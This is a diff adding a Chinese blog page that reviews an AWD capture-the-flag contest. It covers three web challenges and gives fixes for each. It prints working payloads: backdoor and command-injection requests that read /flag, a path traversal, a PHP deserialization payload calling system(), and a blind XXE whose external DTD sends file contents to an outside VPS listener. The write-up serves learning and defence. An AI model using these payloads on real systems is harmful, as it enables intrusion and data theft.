@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta name="author" content="FengHLZ">
+  
+  
+  <title>2020.2.9星盟AWD邀请赛复盘 | xyz|All</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="AWD,">
+  
+
+  
+  <meta name="description" content="感谢星盟安全团队的再一次邀请！">
+
+  
+
+  <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+    <script src="//unpkg.com/valine/dist/Valine.min.js" async></script>
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"mB9CftyvuDc5gN6R44KukJtw-gzGzoHsz","appkey":"gRRwrnOXHglzMIz3blENWVJV","comment":true,"count":true},
+    welcome: {"enable":true,"interval":30},
+    start_time: "2018-07-09",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "FengHLZ",
+    share: {"twitter":true,"facebook":true,"weibo":true,"qq":true,"wechat":true},
+    mathjax: true,
+    page_type: ""
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+<script src="/js/jquery.min.js"></script>
+
+  
+    <link rel="icon" href="/images/siteimage.jpg">
+    <link rel="apple-touch-icon" href="/images/siteimage.jpg">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">FengHLZ.xyz</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | Know it - Do it</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+        <a href="/friends/" target="_self">友链</a>
+      
+        <a href="/about/index.html" target="_self">关于</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/FengHLZ" target="_blank">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2020-02-09
+    </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    2020.2.9星盟AWD邀请赛复盘
+  </h1>
+  
+  <article class="passage-article">
+    <p>星盟安全团队举办的线上AWD，三道Web题，两道pwn题。又学到了很多新姿势。</p>
+<p>记录下三道Web题中我们发现的漏洞和做题过程。</p>
+<h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p>上D盾：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220003.png" alt></p>
+<h3 id="test-php中的预置后门："><a href="#test-php中的预置后门：" class="headerlink" title="test.php中的预置后门："></a><code>test.php</code>中的预置后门：</h3><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220253.png" alt></p>
+<p>赶紧<strong>删文件</strong>，写个脚本批量打。</p>
+<p><strong>payload</strong>：<code>http://39.100.119.37:10480/test.php?out=cat /flag</code></p>
+<h3 id="shell-函数的命令执行漏洞"><a href="#shell-函数的命令执行漏洞" class="headerlink" title="shell()函数的命令执行漏洞"></a>shell()函数的命令执行漏洞</h3><p>在<code>admin/func.php</code>中存在有漏洞的<code>shell</code>函数：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220549.png" alt></p>
+<p><strong>如何快速发现哪个文件调用了shell函数</strong>？</p>
+<p>熟悉代码审计的师傅应该知道<code>ctags</code>和<code>在文件夹中搜索</code>这两个功能。</p>
+<ul>
+<li><p><code>ctags</code>就是定位被调用函数的定义文件：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209220939.png" alt></p>
+<p>这样就能快速找到定义这个函数的文件所在行。</p>
+</li>
+<li><p><code>在文件夹中搜索</code>是一般编辑器都有的功能</p>
+<p>我使用<code>sublime</code>，在文件夹中搜索<code>shell</code>，很快就发现在哪处调用了该函数</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221209.png" alt></p>
+</li>
+</ul>
+<p>利用该漏洞需要先登录后台</p>
+<p>后台登录账号密码：<code>admin111</code>:<code>admin111</code></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221354.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221403.png" alt></p>
+<p><strong>payload</strong>：<code>?shell&amp;out=127.0.0.1;cat /flag</code></p>
+<p><strong>修复方案</strong>：过滤out参数，如果其含有flag字样，直接<code>exit();</code>（这样不严谨，但当时时间紧迫，先这样处理）</p>
+<p>更好的修复方案，shell完成的功能是<code>ping</code>命令，那么我们就使用正则来过滤输入的参数是否是正常的域名或者IP</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^(?=^.&#123;3,255&#125;$)[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(\.[a-z0-9A-Z][-a-zA-Z0-9]&#123;0,62&#125;)+$|^((25[0-5]|2[0-4]\d|[01]?\d\d?)($|(?!\.$)\.))&#123;4&#125;$/'</span>, $target))</span><br></pre></td></tr></table></figure>
+<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><h3 id="假的预置后门"><a href="#假的预置后门" class="headerlink" title="假的预置后门"></a>假的预置后门</h3><p>同Web1一样，在网站根目录下有一个<code>test.php</code>的假后门</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209221725.png" alt></p>
+<p>一开始D盾扫到还挺兴奋的，但利用起来完全没作用</p>
+<p>源码中已经输出了<code>$_</code>、<code>$__</code>、<code>$___</code>的值，跟注释中的<code>$_=&#39;assert&#39;;</code>完全不一样，大概就是出题人皮了一下。</p>
+<p>pass掉。</p>
+<h3 id="目录跳转漏洞"><a href="#目录跳转漏洞" class="headerlink" title="目录跳转漏洞"></a>目录跳转漏洞</h3><p><code>admin/grade.php</code>中，接收文件名，并将文件内容输出到浏览器</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209222506.png" alt></p>
+<p><strong>payload</strong>：<code>http://39.100.119.37:21680/admin/grade.php?file=../../../../flag</code></p>
+<p><strong>修复方案</strong>：正则匹配<code>..</code>，防止目录遍历</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209222935.png" alt></p>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><code>login/logout.php</code></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209223250.png" alt></p>
+<p>比较简单的反序列化利用</p>
+<p><strong>payload</strong>：<code>O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:4:&quot;male&quot;;s:15:&quot;system(&#39;cat /flag&#39;);&quot;;}</code></p>
+<p><strong>修复方案</strong>：多余的操作，直接删除<code>unserialize($_POST[&#39;un&#39;]);</code></p>
+<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>Web3的MySQL服务一直有问题，直到比赛结束前半个小时才恢复。</p>
+<h3 id="盲XXE"><a href="#盲XXE" class="headerlink" title="盲XXE"></a>盲XXE</h3><p><code>loginCheck.php</code></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209230947.png" alt></p>
+<p>登录是通过XML传递<code>username</code>和<code>password</code>参数，而传递的xml我们可控，没有回显，盲XXE读取文件。</p>
+<p>XML：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http://47.112.16.34/xml.dtd&quot;&gt;  </span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;aaa&lt;/message&gt;</span><br></pre></td></tr></table></figure>
+<p>外部<code>DTD</code>文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://47.112.16.34:1337/?%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure>
+<p>在VPS上监听 <code>nc -lp 1337 -vv</code></p>
+<p>抓包请求：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209231527.png" alt></p>
+<p>VPS接收到请求：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209231654.png" alt></p>
+<p>关于盲XXE更多参考学习：<a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>赛后在群里看了下其他师傅分享的思路，不得不服，被骚到了。。最重要的还是权限维持。</p>
+<p>骚思路：</p>
+<p>建立<code>软链接文件</code>到<code>/flag</code></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200209232517.png" alt></p>
+<p>还有发现平台漏洞，拿到所有主机的登录密码：</p>
+<p><img src="file:///F:\2362929771\Image\Group2\N_\0@\N_0@}5%SPZ2R7@0$82~TVMI.jpg" alt="img"></p>
+<p>太强了，向师傅们学习！</p>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web1"><span class="toc-text">Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#test-php中的预置后门："><span class="toc-text">test.php中的预置后门：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-函数的命令执行漏洞"><span class="toc-text">shell()函数的命令执行漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web2"><span class="toc-text">Web2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#假的预置后门"><span class="toc-text">假的预置后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#目录跳转漏洞"><span class="toc-text">目录跳转漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列化"><span class="toc-text">反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web3"><span class="toc-text">Web3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#盲XXE"><span class="toc-text">盲XXE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: FengHLZ</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://www.fenghlz.xyz/passages/2020-2-9-2020-2-9星盟AWD邀请赛复盘/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+    <div class="passage-tags">
+     
+      <a href="/tags/AWD/"><i class="fa fa-tags"></i>AWD</a>
+    
+    </div>
+  
+</div>
+
+    </main>
+    
+      <div class="site-comment-contanier">
+  <p id="site-comment-info">
+    <i class="fa fa-spinner fa-spin"></i> 评论加载中
+  </p>
+  <div id="site-comment">
+  </div>
+</div>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">博客推荐</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://xin-tan.com/" target="_blank">GodBMW</a>
+          </span>
+        
+      </div>
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">在线工具</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://www.ilovepdf.com/zh-cn" target="_blank">iLovePDF</a>
+          </span>
+        
+          <span class="site-footer-item">
+            <a href="https://www.iloveimg.com/zh-cn" target="_blank">iLoveIMG</a>
+          </span>
+        
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: 2362929771@qq.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https:/godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content" style="height:55%;width:40%;">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control"/>
+      </div>
+      <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
+        
+          <div>
+            <img src="/images/wechatpay.png" alt="WeChat">
+            
+              <p>WeChat</p>
+            
+          </div>
+        
+          <div>
+            <img src="/images/alipay.jpg" alt="AliPay">
+            
+              <p>AliPay</p>
+            
+          </div>
+        
+      </div>
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+    <div id="local-search-result" style="height:50%;display:none;"></div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div></div>
+  <div class="bottom-bar-left">
+    <a href="javascript:void(0);" data-enable="false">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/passages/2020-2-8-phpList-3-5-0-Authentication-Bypass-漏洞复现/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+      <a href="#site-comment" data-enable="true">
+        <i class="fa fa-commenting"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    <a href="javascript:void(0);" id="site-reward">
+      <i class="fa fa-thumbs-up"></i>
+    </a>
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+    <a id="share-btn-twitter" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-twitter"></i>
+    </a>
+  
+  
+    <a id="share-btn-facebook" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-facebook"></i>
+    </a>
+  
+  
+    <a id="share-btn-weibo" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-weibo"></i>
+    </a>
+  
+  
+    <a id="share-btn-qq" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-qq"></i>
+    </a>
+  
+  
+    <a id="share-btn-wechat" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-wechat"></i>
+    </a>
+  
+</div>
+    
+  <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+  <script async>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', '');
+  </script>
+
+
+
+  <script async>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+  </script>
+
+
+
+  <script async>
+    (function(){
+    var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?":"https://jspassport.ssl.qhimg.com/11.0.1.js?";
+    document.write('<script src="' + src + '" id="sozz"><\/script>');
+    })();
+  </script>
+
+
+  </body>
+</html>
